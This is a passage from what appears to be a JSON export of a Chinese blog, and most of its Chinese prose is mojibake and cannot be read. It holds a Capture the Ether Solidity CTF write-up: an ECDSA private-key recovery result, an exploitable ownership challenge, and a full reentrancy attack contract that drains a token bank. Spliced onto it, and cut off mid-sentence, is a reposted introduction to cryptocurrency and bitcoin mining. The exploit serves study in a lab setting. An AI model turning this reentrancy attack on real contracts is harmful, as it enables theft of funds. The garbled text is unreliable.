0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141\n\nprint(\"privatekey:%x\\n k:%x\" % derivate_privkey(p,r,s1,s2,z1,z2))\n\nèŽ·å¾—ç»“æžœï¼š\nprivatekey:614f5e36cd55ddab0947d1723693fef5456e5bee24738ba90bd33c0c6e68e269 k:4b7670ee80409a4acee8ff9351f17001534035ecb552e444e93ca6a4242c8afe\nMiscellaneous1.Assume ownershipCodepragma solidity ^0.4.21;\n\ncontract AssumeOwnershipChallenge &#123;\n    address owner;\n    bool public isComplete;\n\n    function AssumeOwmershipChallenge() public &#123;\n        owner = msg.sender;\n    &#125;\n\n    function authenticate() public &#123;\n        require(msg.sender == owner);\n\n        isComplete = true;\n    &#125;\n&#125;\n\nAnalyze&amp;Attackçœ‹ä¼¼æ˜¯constructorï¼Œå…¶å®žå¹¶ä¸æ˜¯ï¼Œç›´æŽ¥è°ƒç”¨å³å¯\n2.Token bankCodepragma solidity ^0.4.21;\n\ninterface ITokenReceiver &#123;\n    function tokenFallback(address from, uint256 value, bytes data) external;\n&#125;\n\ncontract SimpleERC223Token &#123;\n    // Track how many tokens are owned by each address.\n    mapping (address => uint256) public balanceOf;\n\n    string public name = \"Simple ERC223 Token\";\n    string public symbol = \"SET\";\n    uint8 public decimals = 18;\n\n    uint256 public totalSupply = 1000000 * (uint256(10) ** decimals);\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    function SimpleERC223Token() public &#123;\n        balanceOf[msg.sender] = totalSupply;\n        emit Transfer(address(0), msg.sender, totalSupply);\n    &#125;\n\n    function isContract(address _addr) private view returns (bool is_contract) &#123;\n        uint length;\n        assembly &#123;\n            //retrieve the size of the code on target address, this needs assembly\n            length := extcodesize(_addr)\n        &#125;\n        return length > 0;\n    &#125;\n\n    function transfer(address to, uint256 value) public returns (bool success) &#123;\n        bytes memory empty;\n        return transfer(to, value, empty);\n    &#125;\n\n    function transfer(address to, uint256 value, bytes data) public returns (bool) &#123;\n        require(balanceOf[msg.sender] >= value);\n\n        balanceOf[msg.sender] -= value;\n        balanceOf[to] += value;\n        emit Transfer(msg.sender, to, value);\n\n        if (isContract(to)) &#123;\n            ITokenReceiver(to).tokenFallback(msg.sender, value, data);\n        &#125;\n        return true;\n    &#125;\n\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n\n    mapping(address => mapping(address => uint256)) public allowance;\n\n    function approve(address spender, uint256 value)\n        public\n        returns (bool success)\n    &#123;\n        allowance[msg.sender][spender] = value;\n        emit Approval(msg.sender, spender, value);\n        return true;\n    &#125;\n\n    function transferFrom(address from, address to, uint256 value)\n        public\n        returns (bool success)\n    &#123;\n        require(value &lt;= balanceOf[from]);\n        require(value &lt;= allowance[from][msg.sender]);\n\n        balanceOf[from] -= value;\n        balanceOf[to] += value;\n        allowance[from][msg.sender] -= value;\n        emit Transfer(from, to, value);\n        return true;\n    &#125;\n&#125;\n\ncontract TokenBankChallenge &#123;\n    SimpleERC223Token public token;\n    mapping(address => uint256) public balanceOf;\n\n    function TokenBankChallenge(address player) public &#123;\n        token = new SimpleERC223Token();\n\n        // Divide up the 1,000,000 tokens, which are all initially assigned to\n        // the token contract's creator (this contract).\n        balanceOf[msg.sender] = 500000 * 10**18;  // half for me\n        balanceOf[player] = 500000 * 10**18;      // half for you\n    &#125;\n\n    function isComplete() public view returns (bool) &#123;\n        return token.balanceOf(this) == 0;\n    &#125;\n\n    function tokenFallback(address from, uint256 value, bytes) public &#123;\n        require(msg.sender == address(token));\n        require(balanceOf[from] + value >= balanceOf[from]);\n\n        balanceOf[from] += value;\n    &#125;\n\n    function withdraw(uint256 amount) public &#123;\n        require(balanceOf[msg.sender] >= amount);\n\n        require(token.transfer(msg.sender, amount));\n        balanceOf[msg.sender] -= amount;\n    &#125;\n&#125;\n\nAnalyzeè¿™é“é¢˜åšäº†å¤§æ¦‚æœ‰ä¸‰ä¸ªå°æ—¶å·¦å³ï¼Œä¸ªäººæ„Ÿè§‰éš¾åº¦è¿˜æ˜¯ä¸ä½Žçš„ï¼Œå› ä¸ºæ¥å›žæ¥åŽ»çš„æ¯”è¾ƒç»•äººï¼Œå°¤å…¶æ˜¯åœ¨ä»£ç é•¿åº¦ä¸çŸ­çš„æƒ…å†µä¸‹ã€‚\næ¼æ´žå…¶å®žå°±æ˜¯é‡å…¥æ¼æ´žï¼Œwithdrawå‡½æ•°çš„require(token.transfer(msg.sender, amount))ï¼Œè°ƒç”¨withdrawå‡½æ•°çš„è°ƒç”¨è€…åštoken.transferä¸­çš„toï¼Œä»Žè€Œå¯ä»¥å®žçŽ°è°ƒç”¨æ”»å‡»åˆçº¦ä¸‹çš„tokenFallbackå‡½æ•°ï¼Œå¯ä»¥åœ¨æ­¤å¤„æž„é€ é‡å…¥ã€‚\nå› ä¸ºæ­¤æ—¶TokenBankChallengeåˆçº¦ä¸­withdrawå‡½æ•°ä¸‹çš„balanceOf[msg.sender] -&#x3D; amountå¹¶æœªä¿®æ”¹ã€‚\nä½†æ˜¯è°ƒç”¨withdrawå‡½æ•°æœ‰require(balanceOf[msg.sender] &gt;&#x3D; amount)è¦æ±‚ï¼Œæ‰€ä»¥åº”å…ˆä»¥playerèº«ä»½å°†ä½™é¢å–å‡ºå¹¶è½¬ç§»åˆ°æ”»å‡»åˆçº¦ä¸­åŽ»\næ¸…æ¥šæ”»å‡»æµç¨‹ï¼Œå¼€å§‹æž„é€ æ”»å‡»åˆçº¦\nAttackcontract attack&#123;\n    TokenBankChallenge target=TokenBankChallenge(0x26b989b9525Bb775C8DEDf70FeE40C36B397CE67);\n    SimpleERC223Token target2=SimpleERC223Token(0x5886B2693f246fc2171d1a982CB4F7C1A4D25223);\n    uint public i=1;\n    //å…ˆèŽ·å¾—æ¥è‡ªplayerçš„approve\n    //å†ï¼š\n    function get(address from)public&#123;\n        target2.transferFrom(from,this,500000000000000000000000);\n    &#125;//èŽ·å¾—æ¥è‡ªplayerçš„ä½™é¢\n    function must()public&#123;\n        target2.transfer(target,500000000000000000000000,\"\");\n    &#125;//ä½¿æ»¡è¶³é¢˜ç›®åˆçº¦withdrawå‡½æ•°ä¸‹çš„ç¬¬ä¸€ä¸ªrequire\n    function pwn()public&#123;\n        target.withdraw(500000000000000000000000);\n    &#125;\n    function tokenFallback(address a,uint b,bytes)public returns (bool)&#123;\n        if(i==1)\n        &#123;\n            i++;\n            target.withdraw(500000000000000000000000);\n        &#125;\n    return true;\n    &#125;\n&#125;\n\n","slug":"capture the ether","date":"2022-08-02T02:04:12.275Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"222c93087f6d08ca86d2c8de9bb166ac","title":"bitcoin mining","content":"\n\n\nåŠæŠ€æœ¯æ€§æ–‡ç« ï¼Œä¸ºé˜²æ­¢è¿žæŽ¥ä¸¢å¤±ï¼Œæ”¾äºŽè‡ªå·±åšå®¢ï¼Œè½¬è‡ªäºŽï¼šhttp://wiki.tidesec.com/docs/jswz/b8b4baea0469fd48115f88ecf075b649\næ¯”ç‰¹å¸æŒ–çŸ¿ 0x01 æ•°å­—è´§å¸\næˆ‘ä»¬å…ˆçœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ•°å­—è´§å¸ï¼Œæ•°å­—è´§å¸ç®€ç§°ä¸ºDCï¼ˆDigital Currencyï¼‰ï¼Œæ˜¯ç”µå­è´§å¸å½¢å¼çš„æ›¿ä»£è´§å¸ï¼Œæ˜¯ä¸»è¦åœ¨æ•°å­—è®¡ç®—æœºç³»ç»Ÿï¼ˆå°¤å…¶æ˜¯äº’è”ç½‘ï¼‰ä¸Šç®¡ç†ã€å­˜å‚¨æˆ–äº¤æ¢çš„ä»»ä½•è´§å¸ã€è´§å¸æˆ–ç±»ä¼¼è´§å¸çš„èµ„äº§ã€‚\næ•°å­—è´§å¸ä¹Ÿå¯ä»¥è®¤ä¸ºæ˜¯ä¸€ç§åŸºäºŽèŠ‚ç‚¹ç½‘ç»œå’Œæ•°å­—åŠ å¯†ç®—æ³•çš„è™šæ‹Ÿè´§å¸ã€‚å¯¹å·²æœ‰çš„è´§å¸ä½“ç³»æ¥è¯´ï¼Œæ— ç–‘æ˜¯ä¸€ä¸ªå·¨å¤§çš„æŒ‘æˆ˜ã€‚æ•°å­—â€œåŠ å¯†è´§å¸â€å’Œâ€œåŠ å¯†èµ„äº§â€æ—¨åœ¨åæ˜ ä¼ ç»Ÿè´§å¸çš„éƒ¨åˆ†æˆ–å…¨éƒ¨ç”¨é€”â€”â€”æ”¯ä»˜æ‰‹æ®µã€ä»·å€¼å­˜å‚¨å’Œè®°è´¦å•ä½ã€‚\n\n åŽŸå›¾æ¥è‡ªäºŽï¼šwikipediaï¼Œï¼ˆç¿»è¯‘ä¸å‡†ç¡®çš„è¯è§è°…)\n\n\n\n\n\n\n\n\n\nâ€œæ•°å­—è´§å¸æ˜¯ä¸€ç§ä¸å—ç®¡åˆ¶çš„ã€æ•°å­—åŒ–çš„è´§å¸ï¼Œé€šå¸¸ç”±å¼€å‘è€…å‘è¡Œå’Œç®¡ç†ï¼Œè¢«ç‰¹å®šè™šæ‹Ÿç¤¾åŒºçš„æˆå‘˜æ‰€æŽ¥å—å’Œä½¿ç”¨ã€‚â€\nåœ¨è®ºæ–‡ã€Šæ•°å­—è´§å¸çš„æ¦‚å¿µè¾¨æžä¸Žé—®é¢˜äº‰è®®ã€‹ä¸­æåˆ°äº†æ•°å­—è´§å¸çš„æ ¸å¿ƒç‰¹å¾çš„ä¸‰ä¸ªæ–¹é¢ï¼š\n\nç”±äºŽæ¥è‡ªäºŽæŸäº›å¼€æ”¾çš„ç®—æ³•ï¼Œæ•°å­—è´§å¸æ²¡æœ‰å‘è¡Œä¸»ä½“ï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•äººæˆ–æœºæž„èƒ½å¤ŸæŽ§åˆ¶å®ƒçš„å‘è¡Œã€‚\nç”±äºŽç®—æ³•è§£çš„æ•°é‡ç¡®å®šï¼Œæ‰€ä»¥æ•°å­—è´§å¸çš„æ€»é‡å›ºå®šï¼Œè¿™ä»Žæ ¹æœ¬ä¸Šæ¶ˆé™¤äº†è™šæ‹Ÿè´§å¸æ»¥å‘å¯¼è‡´é€šè´§è†¨èƒ€çš„å¯èƒ½ã€‚\nç”±äºŽäº¤æ˜“è¿‡ç¨‹éœ€è¦ç½‘ç»œä¸­çš„å„ä¸ªèŠ‚ç‚¹çš„è®¤å¯ï¼Œå› æ­¤æ•°å­—è´§å¸çš„äº¤æ˜“è¿‡ç¨‹è¶³å¤Ÿå®‰å…¨ã€‚\n\nä¾‹å¦‚åŠ å¯†è´§å¸å°±æ˜¯æ•°å­—è´§å¸çš„ä¸€ç§ï¼Œæ˜¯ä¸€ç§ä½¿ç”¨å¯†ç å­¦åŽŸç†æ¥ç¡®ä¿äº¤æ˜“å®‰å…¨åŠæŽ§åˆ¶äº¤æ˜“å•ä½åˆ›é€ çš„äº¤æ˜“åª’ä»‹ï¼ŒåŠ å¯†è´§å¸ä¸­çš„â€œåŠ å¯†â€æ˜¯æŒ‡å¤æ‚çš„å¯†ç å­¦ã€‚æ¯”ç‰¹å¸åœ¨2009å¹´æˆä¸ºç¬¬ä¸€ä¸ªåŽ»ä¸­å¿ƒåŒ–çš„åŠ å¯†è´§å¸ï¼Œè‡ªæ­¤ä¹‹åŽæ•°ç§ç±»ä¼¼çš„åŠ å¯†è´§å¸è¢«åˆ›é€ ã€‚æˆªè‡³ 2022 å¹´ 2 æœˆï¼Œå­˜åœ¨è¶…è¿‡ 10,000 ç§åŠ å¯†è´§å¸ã€‚å°½ç®¡å…¶ä¸­è®¸å¤šåŠ å¯†è´§å¸å‡ ä¹Žæ²¡æœ‰æˆ–æ²¡æœ‰äº¤æ˜“é‡ï¼Œä½†å…¶ä¸­ä¸€äº›åœ¨ä¸“é—¨çš„æ”¯æŒè€…å’ŒæŠ•èµ„è€…ç¤¾åŒºä¸­éžå¸¸å—æ¬¢è¿Žã€‚\nä¸‹é¢æ˜¯Investopediaç»™å‡ºçš„æ ¹æ®å¸‚å€¼å¯¹ä»£å¸è¿›è¡Œç›¸å¯¹æŽ’å\n é™¤æ¯”\nç‰¹å¸ä»¥å¤–è¿˜æœ‰å¾ˆå¤šé‡è¦çš„åŠ å¯†è´§å¸\nèŽ±ç‰¹å¸ (LTC)æ˜¯ä¸€ç§æ›¿ä»£åŠ å¯†è´§å¸ï¼Œç”±å‰ Google å·¥ç¨‹å¸ˆ Charles â€œCharlieâ€ Lee äºŽ 2011 å¹´ 10 æœˆåˆ›å»ºã€‚èŽ±ç‰¹å¸æ”¹ç¼–è‡ªæ¯”ç‰¹å¸çš„å¼€æºä»£ç ï¼Œä½†åšäº†ä¸€äº›ä¿®æ”¹ã€‚ä¸Žæ¯”ç‰¹å¸ä¸€æ ·ï¼ŒèŽ±ç‰¹å¸åŸºäºŽä¸å—ä»»ä½•ä¸­å¤®æœºæž„æŽ§åˆ¶çš„å¼€æºå…¨çƒæ”¯ä»˜ç½‘ç»œã€‚èŽ±ç‰¹å¸ä¸Žæ¯”ç‰¹å¸çš„ä¸åŒä¹‹å¤„åœ¨äºŽæ›´å¿«çš„å—ç”ŸæˆçŽ‡å’Œä½¿ç”¨ Scrypt ä½œä¸ºå·¥ä½œè¯æ˜Žæ–¹æ¡ˆã€‚\nå¡å°”è¾¾è¯ºï¼ˆADAï¼‰æ˜¯ä¸€ç§â€œOuroboros è‚¡æƒè¯æ˜Žâ€åŠ å¯†è´§å¸ï¼Œç”±å·¥ç¨‹å¸ˆã€æ•°å­¦å®¶å’Œå¯†ç å­¦ä¸“å®¶é‡‡ç”¨åŸºäºŽç ”ç©¶çš„æ–¹æ³•åˆ›å»ºã€‚è¯¥é¡¹ç›®ç”±æŸ¥å°”æ–¯Â·éœæ–¯é‡‘æ£®ï¼ˆCharles Hoskinsonï¼‰å…±åŒåˆ›ç«‹ï¼Œä»–æ˜¯ä»¥å¤ªåŠæœ€åˆçš„äº”ä¸ªåˆ›å§‹æˆå‘˜ä¹‹ä¸€ã€‚åœ¨å¯¹ä»¥å¤ªåŠçš„å‘å±•æ–¹å‘äº§ç”Ÿäº†ä¸€äº›åˆ†æ­§åŽï¼Œä»–ç¦»å¼€äº†ï¼ŒåŽæ¥å¸®åŠ©åˆ›å»ºäº† Cardanoã€‚\næ³¢å¡(Polkadot)æ˜¯ä¸€ç§ç‹¬ç‰¹çš„ PoS åŠ å¯†è´§å¸ï¼Œæ—¨åœ¨æä¾›å…¶ä»–åŒºå—é“¾ä¹‹é—´çš„äº’æ“ä½œæ€§ã€‚å®ƒçš„åè®®æ—¨åœ¨è¿žæŽ¥è®¸å¯å’Œæ— è®¸å¯çš„åŒºå—é“¾ä»¥åŠé¢„è¨€æœºï¼Œä»¥å…è®¸ç³»ç»Ÿåœ¨ä¸€ä¸ªå±‹æªä¸‹ååŒå·¥ä½œã€‚Polkadot çš„æ ¸å¿ƒç»„ä»¶æ˜¯å®ƒçš„ä¸­ç»§é“¾ï¼Œå®ƒå…è®¸ä¸åŒç½‘ç»œçš„äº’æ“ä½œæ€§ã€‚å®ƒè¿˜å…è®¸å¹³è¡Œé“¾æˆ–å…·æœ‰è‡ªå·±çš„æœ¬æœºä»¤ç‰Œçš„å¹¶è¡ŒåŒºå—é“¾ç”¨äºŽç‰¹å®šç”¨ä¾‹ã€‚\næ’æ˜Ÿï¼ˆXLMï¼‰æ˜¯ä¸€ä¸ªå¼€æ”¾çš„åŒºå—é“¾ç½‘ç»œï¼Œæ—¨åœ¨é€šè¿‡è¿žæŽ¥é‡‘èžæœºæž„ä¸ºå¤§é¢äº¤æ˜“æä¾›ä¼ä¸šè§£å†³æ–¹æ¡ˆã€‚é“¶è¡Œå’ŒæŠ•èµ„å…¬å¸ä¹‹é—´çš„å·¨é¢äº¤æ˜“â€”â€”é€šå¸¸éœ€è¦å‡ å¤©æ—¶é—´ï¼Œæ¶‰åŠå¤šä¸ªä¸­ä»‹æœºæž„ï¼Œå¹¶ä¸”èŠ±è´¹å¤§é‡èµ„é‡‘â€”â€”çŽ°åœ¨å‡ ä¹Žå¯ä»¥åœ¨æ²¡æœ‰ä¸­ä»‹æœºæž„çš„æƒ…å†µä¸‹ç«‹å³è¿›è¡Œï¼Œè€Œä¸”å¯¹äºŽè¿›è¡Œäº¤æ˜“çš„äººæ¥è¯´å‡ ä¹Žæ²¡æœ‰æˆæœ¬ã€‚\nç‹—ç‹—å¸ï¼ˆDOGEï¼‰è¢«ä¸€äº›äººè§†ä¸ºæœ€åˆçš„â€œmemecoinâ€ï¼Œéšç€ç¡¬å¸ä»·æ ¼çš„é£™å‡ï¼Œåœ¨ 2021 å¹´å¼•èµ·äº†è½°åŠ¨ã€‚è¿™æžšç¡¬å¸ä»¥æŸ´çŠ¬çš„å½¢è±¡ä½œä¸ºå¤´åƒï¼Œè¢«ä¸€äº›å¤§å…¬å¸æŽ¥å—ä¸ºä¸€ç§æ”¯ä»˜æ–¹å¼ï¼ŒåŒ…æ‹¬è¾¾æ‹‰æ–¯å°ç‰›é˜Ÿã€å…‹ç½—è¯ºæ–¯é˜Ÿï¼Œä»¥åŠâ€”â€”ä¹Ÿè®¸æœ€å¼•äººæ³¨ç›®çš„â€”â€”SpaceXï¼Œä¸€å®¶ç”±åŸƒéš†é©¬æ–¯å…‹æ‹¥æœ‰çš„ç¾Žå›½èˆªç©ºèˆªå¤©åˆ¶é€ å•†.\nå¸å®‰å¸ï¼ˆBNBï¼‰æ˜¯ä¸€ç§å®žç”¨åž‹åŠ å¯†è´§å¸ï¼Œå¯ä½œä¸ºå¸å®‰äº¤æ˜“æ‰€äº¤æ˜“ç›¸å…³è´¹ç”¨çš„æ”¯ä»˜æ–¹å¼ã€‚æŒ‰å¸‚å€¼è®¡ç®—ï¼Œå®ƒæ˜¯ç¬¬ä¸‰å¤§åŠ å¯†è´§å¸ã€‚ä½¿ç”¨ä»£å¸ä½œä¸ºäº¤æ˜“æ‰€æ”¯ä»˜æ‰‹æ®µçš„äººå¯ä»¥è¿›è¡ŒæŠ˜æ‰£äº¤æ˜“ã€‚\n\nç„¶åŽäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ¯”ç‰¹å¸ï¼Œæ¯”ç‰¹å¸( â‚¿ )æ˜¯ä¸€ç§P2På½¢å¼çš„æ•°å­—è´§å¸ï¼Œæ˜¯ä¸€ç§åŽ»ä¸­å¿ƒåŒ–çš„æ•°å­—è´§å¸ï¼Œæ²¡æœ‰ä¸­å¤®é“¶è¡Œæˆ–å•ä¸€ç®¡ç†å‘˜ï¼Œå¯ä»¥åœ¨ç‚¹å¯¹ç‚¹æ¯”ç‰¹å¸ç½‘ç»œä¸Šä»Žä¸€ä¸ªç”¨æˆ·å‘é€åˆ°å¦ä¸€ä¸ªç”¨æˆ·ï¼Œæ— éœ€ä¸­ä»‹ã€‚äº¤æ˜“ç”±ç½‘ç»œèŠ‚ç‚¹é€šè¿‡å¯†ç å­¦è¿›è¡ŒéªŒè¯ï¼Œå¹¶è®°å½•åœ¨ç§°ä¸ºåŒºå—é“¾çš„å…¬å…±åˆ†å¸ƒå¼è´¦æœ¬ä¸­ã€‚æ¯å¹´æ–°å¢žçš„æ•°é‡å¾ˆå°‘ï¼ŒæŒ–å–çš„éš¾åº¦ä¸æ–­åŠ å¤§ã€‚\n\n\n\n\n\n\n\n\n\n\nå›¾ç‰‡åœ°å€ï¼šhttps://www.thebalance.com/thmb/OjKKYcwDRcrM1lmXoO2GUjlVr3A=/672x0/filters:max_bytes(150000):strip_icc():format(webp)&#x2F;can-bitcoin-mining-make-a-profit-4157922_final-db1468c8cf124bd8bf28814939df1831.gif\n2010å¹´ï¼Œæ¯”ç‰¹å¸åªå€¼0.004ç¾Žå…ƒï¼ŒLaszlo Hanyeczæ¯å¤©å°±å¯ä»¥æŒ–å‡ºä¸Šåƒæžšæ¯”ç‰¹å¸ï¼Œä½†æ˜¯å½“æ—¶åŠ å¯†è´§å¸å¹¶æœªæµè¡Œã€‚ä»–åœ¨è®ºå›ä¸Šé¢è¡¨ç¤ºæ„¿æ„ç”¨ 10000 æ¯”ç‰¹å¸æ¢ä¸¤ä¸ªæŠ«è¨ï¼Œä½†æ˜¯ç›´åˆ°ç¬¬å››å¤©ï¼Œæ‰æœ‰äººç”¨25ç¾Žå…ƒä¹°äº†2ä¸ªæŠ«è¨è·Ÿä»–äº¤æ¢äº†è¿™ 10000 æ¯”ç‰¹å¸ï¼Œæœ€åŽæˆäº¤æ—¥çš„é‚£å¤©ä¹Ÿå°±æ˜¯ 5æœˆ22æ—¥ï¼Œè¢«å®šä¹‰ä¸ºâ€œæ¯”ç‰¹å¸æŠ«è¨æ—¥â€ã€‚\nP2Pé¦–å…ˆç†è§£ä¸€ä¸‹P2Pçš„æ„æ€ï¼ŒP2Pæ˜¯è‹±æ–‡peer to peer lendingï¼Œå¯ä»¥ç†è§£ä¸ºä¸ªäººå¯¹ä¸ªäººï¼Œç‚¹å¯¹ç‚¹ã€‚\nåŒºå—é“¾æ¯”ç‰¹å¸çš„åº•å±‚æŠ€æœ¯æ˜¯åŒºå—é“¾ï¼Œæ¯”ç‰¹å¸çš„å‘æ˜Žæ˜¯å¯†ç å­¦çš„ä¸€ä¸ªé‡è¦çªç ´ï¼Œæ¯”ç‰¹å¸çš„å…³é”®åˆ›æ–°ä¹Ÿæ˜¯åŒºå—é“¾ã€‚\næˆ‘ä»¬çŸ¥é“åŒºå—é“¾æ˜¯ä¸€ç§ç±»ä¼¼äºŽè´¦æœ¬çš„è½¯ä»¶ï¼Œè®°å½•ä½¿ç”¨æ¯”ç‰¹å¸è¿›è¡Œçš„æ¯ä¸€ç¬”äº¤æ˜“ï¼Œå®ƒè¢«å®žçŽ°ä¸ºä¸€ä¸ªå—é“¾ï¼Œæ¯ä¸ªå—åŒ…å«å‰ä¸€ä¸ªå—çš„å“ˆå¸Œã€‚ä¸Žé“¶è¡Œçš„è´¦æœ¬ä¸åŒï¼Œæ¯”ç‰¹å¸åŒºå—é“¾åœ¨è®¡ç®—æœºç½‘ç»œä¸­åˆ†å¸ƒå’ŒéªŒè¯ã€‚æ²¡æœ‰å…¬å¸ã€å›½å®¶æˆ–ç¬¬ä¸‰æ–¹å¯ä»¥æŽ§åˆ¶å®ƒï¼Œä»»ä½•äººéƒ½å¯ä»¥æˆä¸ºè¯¥ç½‘ç»œçš„ä¸€éƒ¨åˆ†ã€‚åŒºå—é“¾æŠ€æœ¯å…¶å®žæ˜¯åœ¨æ¯”ç‰¹å¸è¢«åˆ›é€ å‡ºæ¥åŽå‡ºçŽ°çš„ï¼ŒéšåŽï¼Œæ¯”ç‰¹å¸ä»·æ ¼å¤§æ¶¨ï¼Œä¹‹åŽå¼€å§‹å‡ºçŽ°â€œåŒºå—é“¾æŠ€æœ¯â€çš„æ¦‚å¿µã€‚åŒºå—é“¾ä¸­æ¯”è¾ƒé‡è¦çš„å°±æ˜¯åŽ»ä¸­å¿ƒåŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¾—çŸ¥é“ä»€ä¹ˆæ˜¯åŽ»ä¸­å¿ƒåŒ–ï¼Ÿ\nåŽ»ä¸­å¿ƒåŒ–å®˜æ–¹ç»™å‡ºçš„åŽ»ä¸­å¿ƒåŒ–æŒ‡çš„æ˜¯ï¼šâ€œåœ¨ä¸€ä¸ªåˆ†å¸ƒæœ‰ä¼—å¤šèŠ‚ç‚¹çš„ç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªèŠ‚ç‚¹éƒ½å…·æœ‰é«˜åº¦è‡ªæ²»çš„ç‰¹å¾ã€‚èŠ‚ç‚¹ä¹‹é—´å½¼æ­¤å¯ä»¥è‡ªç”±è¿žæŽ¥ï¼Œå½¢æˆæ–°çš„è¿žæŽ¥å•å…ƒã€‚ä»»ä½•ä¸€ä¸ªèŠ‚ç‚¹éƒ½å¯èƒ½æˆä¸ºé˜¶æ®µæ€§çš„ä¸­å¿ƒï¼Œä½†ä¸å…·å¤‡å¼ºåˆ¶æ€§çš„ä¸­å¿ƒæŽ§åˆ¶åŠŸèƒ½ã€‚èŠ‚ç‚¹ä¸ŽèŠ‚ç‚¹ä¹‹é—´çš„å½±å“ï¼Œä¼šé€šè¿‡ç½‘ç»œè€Œå½¢æˆéžçº¿æ€§å› æžœå…³ç³»ã€‚è¿™ç§å¼€æ”¾å¼ã€æ‰å¹³åŒ–ã€å¹³ç­‰æ€§çš„ç³»ç»ŸçŽ°è±¡æˆ–ç»“æž„ï¼Œæˆ‘ä»¬ç§°ä¹‹ä¸ºåŽ»ä¸­å¿ƒåŒ–ã€‚â€æ¯”ç‰¹å¸ç³»ç»Ÿå°±æ˜¯ä¸€ä¸ªåŸºäºŽâ€œç»ˆç«¯è´¦æœ¬è®°å½•â€æŠ€æœ¯çš„åŽ»ä¸­å¿ƒåŒ–ç‚¹å¯¹ç‚¹æ¨¡å¼ã€‚é‚£ä¹ˆä¸ºä»€ä¹ˆè¦åŽ»ä¸­å¿ƒåŒ–ï¼Ÿå› ä¸ºåŽ»ä¸­å¿ƒåŒ–æ›´åŠ å®‰å…¨å¯é ï¼Œèƒ½å¤Ÿé™ä½Žç»´æŠ¤æˆæœ¬ï¼Œæ›´åŠ å…¬å¼€é€æ˜Žã€‚\n0x03 æ¯”ç‰¹å¸çš„æ‰€æœ‰æƒåœ¨åŒºå—é“¾ä¸­ï¼Œæ¯”ç‰¹å¸è¢«æ³¨å†Œåˆ°æ¯”ç‰¹å¸åœ°å€ã€‚åˆ›å»ºä¸€ä¸ªæ¯”ç‰¹å¸åœ°å€åªéœ€è¦é€‰æ‹©ä¸€ä¸ªéšæœºçš„æœ‰æ•ˆç§é’¥å¹¶è®¡ç®—ç›¸åº”çš„æ¯”ç‰¹å¸åœ°å€ã€‚å¦‚æžœç§é’¥ä¸¢å¤±ï¼Œæ¯”ç‰¹å¸ç½‘ç»œå°†æ— æ³•è¯†åˆ«ä»»ä½•å…¶ä»–æ‰€æœ‰æƒè¯æ®ï¼›ç¡¬å¸ç„¶åŽæ— æ³•ä½¿ç”¨ï¼Œå¹¶ä¸”å®žé™…ä¸Šä¸¢å¤±äº†ã€‚ä¾‹å¦‚ï¼Œ2013 å¹´ï¼Œä¸€ä½ç”¨æˆ·å£°ç§°ä¸¢å¤±äº† 7,500 ä¸ªæ¯”ç‰¹å¸ï¼Œå½“æ—¶ä»·å€¼ 750 ä¸‡ç¾Žå…ƒï¼Œå½“æ—¶ä»–ä¸å°å¿ƒä¸¢å¼ƒäº†åŒ…å«ä»–çš„ç§é’¥çš„ç¡¬ç›˜é©±åŠ¨å™¨ã€‚å¤§çº¦ 20% çš„æ¯”ç‰¹å¸è¢«è®¤ä¸ºä¸¢å¤±äº†â€”â€”æŒ‰ 2018 å¹´ 7 æœˆçš„ä»·æ ¼è®¡ç®—ï¼Œå®ƒä»¬çš„å¸‚å€¼çº¦ä¸º 200 äº¿ç¾Žå…ƒã€‚\n0x04 æ¯”ç‰¹å¸æŒ–çŸ¿æ¯”ç‰¹å¸æŒ–çŸ¿æ˜¯åœ¨åŒºå—é“¾ä¸ŠéªŒè¯å’Œè®°å½•æ¯”ç‰¹å¸äº¤æ˜“çš„è¿‡ç¨‹ã€‚æ¯”ç‰¹å¸çŸ¿å·¥ä½¿ç”¨å¼ºå¤§çš„è®¡ç®—æœºæ¥å®Œæˆç§°ä¸ºå“ˆå¸Œçš„å¤æ‚æ•°å­¦å‡½æ•°ã€‚\né™¤äº†ä»¥å¯ä¿¡ã€åŽ»ä¸­å¿ƒåŒ–çš„æ–¹å¼éªŒè¯äº¤æ˜“å¤–ï¼Œæ¯”ç‰¹å¸æŒ–çŸ¿è¿˜å¯ä»¥åˆ›é€ äº†æ–°çš„æ¯”ç‰¹å¸ï¼Œä»¥æ·»åŠ åˆ°å·²ç»æµé€šçš„æ¯”ç‰¹å¸ä¸­ã€‚è¿™ç§äº¤æ˜“éªŒè¯æ–¹æ³•è¢«ç§°ä¸ºå·¥ä½œé‡è¯æ˜Žï¼ˆPoWï¼‰ã€‚å› ä¸ºçŸ¿å·¥å¿…é¡»è¯æ˜Žä»–ä»¬å·²ç»å®Œæˆäº†è§£å†³è¿™äº›å¤æ‚æ•°å­¦é—®é¢˜çš„å·¥ä½œï¼Œæ‰èƒ½èŽ·å¾—éªŒè¯æ–°æ¯”ç‰¹å¸äº¤æ˜“åŒºå—çš„æƒåˆ©ã€‚ç”±äºŽè§£å†³è¿™äº›æ•°å­¦é—®é¢˜éœ€è¦æžé«˜çš„å¤„ç†èƒ½åŠ›ï¼Œæ¯”ç‰¹å¸çŸ¿å·¥é€šå¸¸ä½¿ç”¨ä¸“é—¨çš„å›¾å½¢å¤„ç†å•å…ƒæˆ–GPUï¼Œä»¥åŠä¸“ç”¨é›†æˆç”µè·¯æˆ–ASICã€‚\n0x05 æ¯”ç‰¹å¸æŒ–çŸ¿å¦‚ä½•è¿ä½œæ¯”ç‰¹å¸æŒ–çŸ¿æ˜¯éªŒè¯æ–°çš„æ¯”ç‰¹å¸äº¤æ˜“åŒºå—å¹¶å°†å…¶æ·»åŠ 